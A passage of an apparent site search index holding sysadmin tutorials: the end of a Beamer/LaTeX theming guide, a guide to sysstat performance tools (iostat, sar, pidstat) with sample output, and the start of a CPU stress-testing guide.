linkYou’ve seen how to create a frame! It’s really easy. I suggest for all of your frames that you have this kind of blocks:\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\begin{frame}{Title frame 2} Content frame 1 \\end{frame} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\begin{frame}{Title frame 2} Content frame 2 \\end{frame} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Insert images linkWe already seen it but didn’t see the alignment yet. You can decide to have a center alignment and including an image like this:\n\\begin{center} \\includegraphics[height=52mm]{images/image.jpg} \\end{center} Vertical alignment linkYou can set vertical alignment of an image like this:\n\\begin{center} \\vspace{-25pt} \\includegraphics[height=52mm]{images/image.jpg} \\end{center} Insert Dia exported LaTeX images linkIn Dia, you can export to LaTeX and then import it like an image in your tex file. In Dia export in “Macros PGF LaTeX” format, then include it like that:\n\\begin{center} \\input{images/image.tex} \\end{center} Resize imported Dia images linkYou can resize Dia images, in editing directly the .tex file and modifying this line at the beginning of the document:\n\\setlength{\\du}{15\\unitlength} Change the number (here 15) by the desired size.\nItems list linkTo add an item list:\n\\begin{itemize} \\item item 1 \\item item 2 \\item item 3 \\end{itemize} Symbols linkYou can insert symbols like arrows with ‘$’ sign:\n$\\rightarrow$ $\\leftarrow$ You can find a list of symbols here5.\nInsert file content linkI use it to add configuration file for example. Here is how to insert a file contained in the config folder:\n\\script{file.conf}{/path/to/file.conf} This will keep format text without needing to insert escape chars…\nInsert command blocks linkTo insert a command block, you can do like that:\n\\begin{block}{mycommand} \\begin{lstlisting} $ my_command argument1 argument2 \\end{lstlisting} \\end{block} This will keep format text without needing to insert escape chars…You will also need to insert the [fragile] element at the beginning of the frame:\n\\begin{frame}[fragile]{my_frame} Insert color blocks linkWarning bloc linkIf you need to insert a warning block:\n\\begin{alertblock}{Warning} Warning block \\end{alertblock} Notes linkIf you want to insert a notes block:\n\\begin{exampleblock}{Notes} Notes block \\end{exampleblock} Custom theme linkHere is my theme with colors. There are normally enough comments to understand what each thing does:\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % % Deimos Beamer/LaTeX Presentation Color Theme % %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\mode %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Document default font size %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\usepackage{scrextend} \\changefontsizes{9.5pt} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Colors %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\DefineNamedColor{named}{DeimosBlue}{RGB}{48,90,148} \\DefineNamedColor{named}{DeimosBlueLight}{RGB}{153,179,216} \\setbeamercolor{structure}{bg=black, fg=DeimosBlue} \\setbeamercolor{section in toc}{fg=black,bg=white} \\setbeamercolor{alerted text}{fg=DeimosBlue!80!DeimosBlueLight} \\setbeamercolor*{palette primary}{fg=DeimosBlue!60!black,bg=DeimosBlueLight!30!white} \\setbeamercolor*{palette secondary}{fg=DeimosBlue!70!black,bg=DeimosBlueLight!15!white} \\setbeamercolor*{palette tertiary}{bg=DeimosBlue!80!black,fg=DeimosBlueLight!10!white} \\setbeamercolor*{palette quaternary}{fg=DeimosBlue,bg=DeimosBlueLight!5!white} \\setbeamercolor*{sidebar}{fg=DeimosBlue,bg=DeimosBlueLight!15!white} \\setbeamercolor*{palette sidebar primary}{fg=DeimosBlue!10!black} \\setbeamercolor*{palette sidebar secondary}{fg=white} \\setbeamercolor*{palette sidebar tertiary}{fg=DeimosBlue!50!black} \\setbeamercolor*{palette sidebar quaternary}{fg=DeimosBlueLight!10!white} %\\setbeamercolor*{titlelike}{parent=palette primary} \\setbeamercolor{titlelike}{parent=palette primary,fg=DeimosBlue} \\setbeamercolor{frametitle}{bg=DeimosBlueLight!10!white} \\setbeamercolor{frametitle right}{bg=DeimosBlueLight!60!white} \\setbeamercolor*{separation line}{} \\setbeamercolor*{fine separation line}{} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Blocks %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Classic block \\setbeamercolor{block title}{fg=white,bg=DeimosBlue} \\setbeamercolor{block body}{fg=black,bg=DeimosBlueLight!30} \\setbeamerfont{block title}{size=\\footnotesize} \\setbeamerfont{block body}{size=\\footnotesize} % Usage: %\\begin{block}{Normal block} % Texte du block \\texttt{Normal block} %\\end{block} % Warning block \\setbeamercolor{block title alerted}{fg=black,bg=red!70} \\setbeamercolor{block body alerted}{fg=black,bg=red!20} % Usage: %\\begin{alertblock}{Warning block} % Texte du block \\texttt{alertblock} %\\end{alertblock} % Information block \\setbeamercolor{block title example}{fg=black,bg=yellow!70} \\setbeamercolor{block body example}{fg=black,bg=yellow!20} % Usage: %\\begin{exampleblock}{Notes} % Exemple de block \\texttt{Notes} %\\end{exampleblock} \\mode Custom functions linkHere are my custom functions and document specificities. There are normally enough comments to understand what each thing does:\n%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % % Deimos Beamer/LaTeX Presentation Theme % %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\mode %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Presentation %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Footer \\useoutertheme[footline=authorinstitutetitle]{miniframes} % Show frame number and total frame number \\expandafter\\def\\expandafter\\insertshorttitle\\expandafter{% \\insertshorttitle\\hfill% \\insertframenumber\\,/\\,\\inserttotalframenumber} \\setbeamercolor{separation line}{use=structure,bg=structure.fg!50!bg} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Items look %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\setbeamertemplate{itemize items}[default] \\setbeamertemplate{enumerate items}[default] \\useinnertheme{rounded} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Redefine header %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Customize header / Enable bullet points if you remove it % http://tex.stackexchange.com/questions/17288/is-it-possible-to-get-rid-of-the-bullets-in-the-miniframes-outer-theme \\setbeamertemplate{headline}{% % First line \\begin{beamercolorbox}[ht=10pt,dp=1.125ex,% leftskip=.3cm,rightskip=.3cm plus1fil]{section in head/foot} \\usebeamerfont{section in head/foot}\\usebeamercolor[fg]{section in head/foot}% {\\footnotesize \\inserttitle : \\insertsectionhead} \\end{beamercolorbox}% % Separation \\begin{beamercolorbox}[colsep=1.5pt]{middle separation line head} \\end{beamercolorbox} % Second line \\begin{beamercolorbox}[ht=0ex,dp=0ex,% leftskip=.3cm,rightskip=.3cm plus1fil]{subsection in head/foot} \\usebeamerfont{subsection in head/foot}%\\insertsubsectionhead \\end{beamercolorbox}% % Separation \\begin{beamercolorbox}[colsep=1.5pt]{lower separation line head} \\end{beamercolorbox} } %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Margins %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Margin size \\setbeamersize{text margin left=1em,text margin right=1em} % Spaces between paragraphs \\setlength{\\parskip}{5pt} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % PDF should have good informations %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\pdfinfo{ /Title /Creator /Author } %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Subsection reminder %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\AtBeginSubsection[] { \\frame { \\frametitle{Plan} \\tableofcontents[sectionstyle=show/hide,subsectionstyle=show/shaded/hide] } } %\\defbeamertemplate*{Deimos}{miniframes theme} %{% %\t\\begin{beamercolorbox}[ht=2.25ex,dp=5ex]{section in head/foot} % \\insertnavigation{\\paperwidth} %\t%\\insertsectionnavigationhorizontal{\\paperwidth}{}{\\hfill\\hfill} %\t\\end{beamercolorbox}% %}% %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Table of content %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Toc with line numbers and dashes \\newcounter{sectionpage} \\long\\def\\beamer@section[#1]#2{% \\beamer@savemode% \\mode% \\ifbeamer@inlecture \\refstepcounter{section}% \\beamer@ifempty{#2}% {{\\long\\def\\secname{#1}\\long\\def\\lastsection{#1}}% {\\global\\advance\\beamer@tocsectionnumber by 1\\relax% \\long\\def\\secname{#2}% \\long\\def\\lastsection{#1}% \\setcounter{sectionpage}{\\insertframenumber}\\stepcounter{sectionpage}% \\addtocontents{toc}{\\protect\\beamer@sectionintoc{\\the\\c@section}{#2~\\dotfill~\\thesectionpage}{\\the\\c@page}{\\the\\c@part}% {\\the\\beamer@tocsectionnumber}}}% {\\let\\\\=\\relax\\xdef\\sectionlink{{Navigation\\the\\c@page}{\\noexpand\\secname}}}% \\beamer@tempcount=\\c@page\\advance\\beamer@tempcount by -1% \\beamer@ifempty{#1}{}{}% \\addtocontents{nav}{\\protect\\headcommand{\\protect\\sectionentry{\\the\\c@section}{#1}{\\the\\c@page}{\\secname}{\\the\\c@part}}}% \\addtocontents{nav}{\\protect\\headcommand{\\protect\\beamer@sectionpages{\\the\\beamer@sectionstartpage}{\\the\\beamer@tempcount}}}% \\addtocontents{nav}{\\protect\\headcommand{\\protect\\beamer@subsectionpages{\\the\\beamer@subsectionstartpage}{\\the\\beamer@tempcount}}}% }% \\beamer@sectionstartpage=\\c@page% \\beamer@subsectionstartpage=\\c@page% \\def\\insertsection{\\expandafter\\hyperlink\\sectionlink}% \\def\\insertsubsection{}% \\def\\insertsubsubsection{}% \\def\\insertsectionhead{\\hyperlink{Navigation\\the\\c@page}{#1}}% \\def\\insertsubsectionhead{}% \\def\\insertsubsubsectionhead{}% \\def\\lastsubsection{}% \\Hy@writebookmark{\\the\\c@section}{\\secname}{Outline\\the\\c@part.\\the\\c@section}{2}{toc}% \\hyper@anchorstart{Outline\\the\\c@part.\\the\\c@section}\\hyper@anchorend% \\beamer@ifempty{#2}{\\beamer@atbeginsections}{\\beamer@atbeginsection}% \\fi% \\beamer@resumemode}% \\def\\beamer@subsection[#1]#2{% \\beamer@savemode% \\mode% \\ifbeamer@inlecture% \\refstepcounter{subsection}% \\beamer@ifempty{#2}{\\long\\def\\subsecname{#1}\\long\\def\\lastsubsection{#1}} {% \\long\\def\\subsecname{#2}% \\long\\def\\lastsubsection{#1}% \\setcounter{sectionpage}{\\insertframenumber}\\stepcounter{sectionpage}% \\addtocontents{toc}{\\protect\\beamer@subsectionintoc{\\the\\c@section}{\\the\\c@subsection}{#2~\\dotfill~\\thesectionpage}{\\the\\c@page}{\\the\\c@part}{\\the\\beamer@tocsectionnumber}}% }% \\beamer@tempcount=\\c@page\\advance\\beamer@tempcount by -1% \\addtocontents{nav}{% \\protect\\headcommand{\\protect\\beamer@subsectionentry{\\the\\c@part}{\\the\\c@section}{\\the\\c@subsection}{\\the\\c@page}{\\lastsubsection}}% \\protect\\headcommand{\\protect\\beamer@subsectionpages{\\the\\beamer@subsectionstartpage}{\\the\\beamer@tempcount}}% }% \\beamer@subsectionstartpage=\\c@page% \\edef\\subsectionlink{{Navigation\\the\\c@page}{\\noexpand\\subsecname}}% \\def\\insertsubsection{\\expandafter\\hyperlink\\subsectionlink}% \\def\\insertsubsubsection{}% \\def\\insertsubsectionhead{\\hyperlink{Navigation\\the\\c@page}{#1}}% \\def\\insertsubsubsectionhead{}% \\Hy@writebookmark{\\the\\c@subsection}{#2}{Outline\\the\\c@part.\\the\\c@section.\\the\\c@subsection.\\the\\c@page}{3}{toc}% \\hyper@anchorstart{Outline\\the\\c@part.\\the\\c@section.\\the\\c@subsection.\\the\\c@page}\\hyper@anchorend% \\beamer@ifempty{#2}{\\beamer@atbeginsubsections}{\\beamer@atbeginsubsection}% \\fi% \\beamer@resumemode} % Triangle in summary \\setbeamertemplate{subsection in toc}{% \\leavevmode\\leftskip=5.65ex% \\llap{\\raisebox{0.2ex}{\\textcolor{structure}{$\\blacktriangleright$}}\\kern1ex}% \\inserttocsubsection\\par% } %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Other options %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\DeclareOptionBeamer{compress}{\\beamer@compresstrue} \\ProcessOptionsBeamer % Remove navigation symbols \\setbeamertemplate{navigation symbols}{} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Listing %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Listings (used for formated text) \\RequirePackage{listingsutf8} \\lstset { basicstyle = \\ttfamily, inputencoding = utf8/latin9, showstringspaces = false, aboveskip\t= -1pt, belowskip\t= -1pt, } %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% % Functions %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% \\RequirePackage{fancyvrb} \\DefineVerbatimEnvironment{exemple}{Verbatim}{} \\DefineVerbatimEnvironment{intercom}{Verbatim}{commandchars=\\\\\\{\\}} % Code syntax % Usage : \\script{fichier} \\newcommand{\\script}[3][]{ \\smallskip \\VerbatimInput [ frame = single , framesep = 0.5ex , label = {#3} , obeytabs = true , fontsize = \\scriptsize, #1 , ] {config/#2} } \\mode References link https://bitbucket.org/rivanvx/beamer/wiki/HomeBeamer ↩︎\nhttp://mirrors.linsrv.net/tex-archive/graphics/pgf/contrib/smartdiagram/smartdiagram.pdf ↩︎\nhttp://www.hartwork.org/beamer-theme-matrix/ ↩︎\nhttp://titilog.free.fr/ ↩︎\nhttp://www.combinatorics.net/Resources/weblib/A.7/a7.html ↩︎\n"
            }
        );
    index.add(
            {
                id:  211 ,
                href: "\/Sysstat_:_Des_outils_indispensable_pour_analyser_des_probl%C3%A8mes_de_performances\/",
                title: "Sysstat: Essential Tools for Analyzing Performance Issues",
                description: "Learn how to use Sysstat tools including iostat and sar to monitor and analyze system performance issues across Linux and Solaris systems.",
                content: " Introduction linkSysstat is a package containing the sar and iostat binaries. The latter is used to monitor only disk I/O, while sar is used to monitor almost everything.\nInstallation linkDebian linkOn Debian, you need to install sysstat:\naptitude install sysstat Red Hat linkOn Red Hat, you need to install sysstat:\nyum install sysstat Solaris linkOn Solaris, you’ll need to use Sun Freeware packages to find this tool:\npkg-get install CSWsysstat iostat linkiostat allows you to measure disk I/O. If you want to test the performance of disks mounted on your machines, I recommend using screen to see real-time results.\nLinux linkOn Linux, here’s how to use it on the sda disk, for example:\n\u003e iostat -x sda 1 5 avg-cpu: %user %nice %system %iowait %steal %idle 0,21 0,00 0,29 0,05 0,00 99,45 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s avgrq-sz avgqu-sz await svctm %util sda 0,71 1,25 1,23 0,76 79,29 15,22 47,55 0,01 2,84 0,73 0,14 avg-cpu: %user %nice %system %iowait %steal %idle 0,00 0,00 0,00 0,00 0,00 100,00 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s avgrq-sz avgqu-sz await svctm %util sda 0,00 0,00 1,00 0,00 16,00 0,00 16,00 0,00 1,00 1,00 0,10 avg-cpu: %user %nice %system %iowait %steal %idle 0,00 0,00 0,00 0,00 0,00 100,00 -x: extended statistics mode 1: This means that every second, iostat will analyze the performance of all disks 5: For 5 seconds The first lines of the iostat command provide an average of I/O since the machine was booted. Here are some explanations of the columns:\nr/s: read operations per second w/s: write operations per second await: wait time (r/s + w/s) To know if there are sequential reads/writes on the disk:\nrrqm/s: number of merged read requests per second wrqm/s: number of merged write requests per second The more sequential the reads, the faster (on non-SSD disks), the more scattered the sectors, the longer the wait.\nFor testing, here is some useful information1:\nAdvise to drop cache for whole file dd if=ifile iflag=nocache count=0 Ensure drop cache for whole file dd of=ofile oflag=nocache conv=notrunc,fdatasync count=0 Drop cache for part of file dd if=ifile iflag=nocache skip=10 count=10 of=/dev/null Stream data just using readahead cache dd if=ifile of=ofile iflag=nocache oflag=nocache Solaris linkOn Solaris, the commands are a bit different:\niostat -xcnCXTdz 1 To stress the disk, we will use the dd command, which is a low-level command:\ndd if=/dev/zero of=/export/home/dd.img bs=10485760 count=100 Here is a small shell script that does everything for you (bench_disk.sh):\n#!/bin/sh # Made by Pierre Mavro echo \"What size of file would you like to test (in Mo)? (ex. 10240 for 10Go) :\" read size echo \"Choose your requiered device :\" df | awk '{ print $1 }' read device echo \"\" echo \"Please enter to confirm : a test_array_file file of $size will be created in $device\" read ok echo \"\" echo \"Starting disk bench (Ctrl+C to stop)...\" dd if=/dev/zero of=$device/test_array_file bs=1024k count=$size \u0026 iostat -nmCxz 1 sar linksar is a tool that will allow us to monitor many things. When installing sysstat, sar will set itself up in crontab to regularly execute probes placed in /var/log/sa.\nYou can change the default crontab at any time:\n# Run system activity accounting tool every 10 minutes */10 * * * * root /usr/lib64/sa/sa1 -S DISK 1 1 # 0 * * * * root /usr/lib64/sa/sa1 -S DISK 600 6 \u0026 # Generate a daily summary of process accounting at 23:53 53 23 * * * root /usr/lib64/sa/sa2 -A Uncomment all lines or adjust according to your needs. To read these files afterward, use the sar command like this:\nsar -d -f /var/log/sa/saXX XX: day of the month One important thing before using sar, create an alias in your bashrc or the preferences file for your favorite shell so that the hours are displayed correctly:\nalias sar='LANG=C sar' Disks linkTo monitor disks, use the -d option:\n\u003e sar -d 1 2 13:57:03 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 13:57:04 dev8-16 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 13:57:04 dev8-0 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 13:57:04 dev253-0 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 13:57:04 dev253-1 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 13:57:04 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 13:57:05 dev8-16 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 13:57:05 dev8-0 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 13:57:05 dev253-0 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 13:57:05 dev253-1 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 Moyenne: DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util Moyenne: dev8-16 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 Moyenne: dev8-0 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 Moyenne: dev253-0 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 Moyenne: dev253-1 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 As you can see, the last lines correspond to the averages since the machine was booted.\nIf the disk devices don’t make much sense to you, you can use the -p option:\n\u003e sar -d -p 1 2 14:13:28 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 14:13:29 sdb 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 14:13:29 sda 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 14:13:29 VolGroup-lv_root 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 14:13:29 VolGroup-lv_swap 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 14:13:29 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 14:13:30 sdb 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 14:13:30 sda 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 14:13:30 VolGroup-lv_root 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 14:13:30 VolGroup-lv_swap 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 Moyenne: DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util Moyenne: sdb 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 Moyenne: sda 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 Moyenne: VolGroup-lv_root 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 Moyenne: VolGroup-lv_swap 0,00 0,00 0,00 0,00 0,00 0,00 0,00 0,00 CPU linkTo analyze the CPU:\n\u003e sar -u 1 3 14:20:56 CPU %user %nice %system %iowait %steal %idle 14:20:57 all 0,00 0,00 0,00 0,00 0,00 100,00 14:20:58 all 0,00 0,00 0,00 0,00 0,00 100,00 14:20:59 all 0,00 0,00 0,99 0,00 0,00 99,01 Moyenne: all 0,00 0,00 0,33 0,00 0,00 99,67 Memory linkTo monitor memory:\n\u003e sar -r 1 30 Linux 3.2.0-3-amd64 (deb-pmavro) 13/09/2012 _x86_64_\t(2 CPU) 18:17:01 kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact 18:17:02 275472 3617496 92,92 220604 1635456 4294436 55,08 2053992 1312976 18:17:03 275612 3617356 92,92 220604 1635140 4294136 55,08 2054064 1312708 18:17:04 268048 3624920 93,11 220616 1642852 4302016 55,18 2054192 1320488 18:17:05 276356 3616612 92,90 220616 1634612 4293660 55,07 2054348 1312128 You can also use vmstat to monitor memory:\n\u003e vmstat -n 1 30 procs -----------memory---------- ---swap-- -----io---- -system-- ----cpu---- r b swpd free buff cache si so bi bo in cs us sy id wa 0 0 52600 272952 220800 1636336 0 1 572 587 471 222 19 3 75 3 3 0 52600 272828 220804 1635904 0 0 0 140 2969 6041 16 3 79 2 0 0 52600 275108 220804 1635492 0 0 0 0 3016 6002 18 3 80 0 0 0 52600 274984 220804 1635184 0 0 0 220 2327 4608 14 3 83 0 0 0 52600 277836 220804 1635044 0 0 0 0 2868 5820 24 4 72 0 free, buff, and cache: the amount of memory in KiB that is idle si and so: correspond to swap usage swpd: the size in KiB of swap used To monitor the rate of change:\n\u003e sar -R 1 30 Linux 3.2.0-3-amd64 (deb-pmavro) 13/09/2012 _x86_64_\t(2 CPU) 18:18:42 frmpg/s bufpg/s campg/s 18:18:43 -2203,00 0,00 2202,00 18:18:44 713,00 0,00 8,00 18:18:45 -279,00 0,00 404,00 18:18:46 186,00 0,00 -13,00 18:18:47 -93,00 0,00 26,00 18:18:48 -155,00 2,00 -18,00 18:18:49 62,00 0,00 -44,00 Swap linkTo analyze swap:\n\u003e sar -W 1 3 14:22:10 pswpin/s pswpout/s 14:22:11 0,00 0,00 14:22:12 0,00 0,00 14:22:13 0,00 0,00 Moyenne: 0,00 0,00 Network linkFor network analysis:\n\u003e sar -n DEV 1 2 14:23:47 IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s 14:23:48 lo 0,00 0,00 0,00 0,00 0,00 0,00 0,00 14:23:48 eth0 1,00 1,00 0,06 0,17 0,00 0,00 0,00 14:23:48 IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s 14:23:49 lo 0,00 0,00 0,00 0,00 0,00 0,00 0,00 14:23:49 eth0 2,00 1,00 0,12 0,38 0,00 0,00 1,00 Moyenne: IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s Moyenne: lo 0,00 0,00 0,00 0,00 0,00 0,00 0,00 Moyenne: eth0 1,50 1,00 0,09 0,28 0,00 0,00 0,50 IO Operations linkTo monitor all I/O operations:\n\u003e sar -B 1 30 Linux 3.2.0-3-amd64 (deb-pmavro) 13/09/2012 _x86_64_\t(2 CPU) 18:19:33 pgpgin/s pgpgout/s fault/s majflt/s pgfree/s pgscank/s pgscand/s pgsteal/s %vmeff 18:19:34 0,00 0,00 106,00 0,00 3105,00 0,00 0,00 0,00 0,00 18:19:35 0,00 0,00 58,00 0,00 1567,00 0,00 0,00 0,00 0,00 18:19:36 0,00 0,00 82,00 0,00 1039,00 0,00 0,00 0,00 0,00 18:19:37 0,00 0,00 205,00 0,00 1530,00 0,00 0,00 0,00 0,00 18:19:38 0,00 44,00 131,00 0,00 1192,00 0,00 0,00 0,00 0,00 Processes linkIt is possible to get a lot of information about a specific process using the pidstat command:\n\u003e pidstat -p 2365 1 50 Linux 3.2.0-4-amd64 (ZG020194) 05/07/2013 _x86_64_\t(2 CPU) 02:12:57 PM PID %usr %system %guest %CPU CPU Command 02:12:58 PM 2365 1.00 0.00 0.00 1.00 0 awesome 02:12:59 PM 2365 0.00 0.00 0.00 0.00 0 awesome 02:13:00 PM 2365 0.00 1.00 0.00 1.00 0 awesome It is also possible to monitor I/O (-d) or even the top 5 processes in page fault:\n\u003e pidstat -T CHILD -r 2 5 Linux 3.2.0-4-amd64 (ZG020194) 05/07/2013 _x86_64_\t(2 CPU) 02:16:02 PM PID minflt-nr majflt-nr Command 02:16:04 PM 2252 1 0 VBoxService 02:16:04 PM 2365 50 0 awesome 02:16:04 PM 4938 7 0 firefox 02:16:04 PM 5051 171 0 pidstat FAQ linksar: can’t open /var/adm/sa/saXX: No such file or directory linkYou want to use the “sar” command on Solaris to perform monitoring or performance analysis on your server, but when you execute the command, you get an error similar to the following:\nsar: can't open /var/adm/sa/saXX: No such file or directory The answer is in the manpage for “sadc”. You need to execute the following command, and you should be able to execute the command without issue after running this:\nsu sys -c \"/usr/lib/sa/sadc /var/adm/sa/sa`date +%d`\" Resources linkhttp://www.cyberciti.biz/open-source/command-line-hacks/linux-monitor-process-using-pidstat/\nhttp://comments.gmane.org/gmane.comp.gnu.coreutils.general/904 ↩︎\n"
            }
        );
    index.add(
            {
                id:  212 ,
                href: "\/Cpuburn_:_stresser_son_CPU\/",
                title: "CPUBurn: Stress Testing Your CPU",
                description: "A guide on how to stress test your CPU in Linux and monitor system statistics during testing.",
                content: "There are plenty of system stress testing applications for Windows, but what about Linux? Here is a simple way to stress test your CPU in Linux and monitor various system statistics while doing it. This can be used for testing an overclocked system or just to burn in a new CPU.\nInstalling CPUBurn linkFirst install cpuburn:\naptitude install cpuburn You can run CPU Burn-In with:\nburnP6 Using Stress linkYou can also use stress:\naptitude install stress Then launch it:\nstress --cpu 2 --io 1 --vm 1 --vm-bytes 128M --timeout 10s --verbose Monitoring Tools linkNow for a few diagnostic tools. First install lm-sensors. This program can read various sensor chips in your system and report their outputs. This gives you access to things like CPU temperature, core voltage, and fan speeds. In Ubuntu you can install lm-sensors with:\nsudo apt-get install lm-sensors Once you have done this you have to configure lm-sensors so it knows about the sensors in your system. To do this run:\nsudo /usr/sbin/sensors-detect In most cases you can choose the default answer at each of the programs prompts. When you get to the end, the program will tell you that you need to add some lines to several system files. In my case I was asked to add the following:\nTo make the sensors modules behave correctly, add these lines to /etc/modules: #----cut here---- # I2C adapter drivers # modprobe unknown adapter NVIDIA i2c adapter 0 at 5:00.0 # modprobe unknown adapter NVIDIA i2c adapter 1 at 5:00.0 # modprobe unknown adapter NVIDIA i2c adapter 2 at 5:00.0 # modprobe unknown adapter NVIDIA i2c adapter 0 at 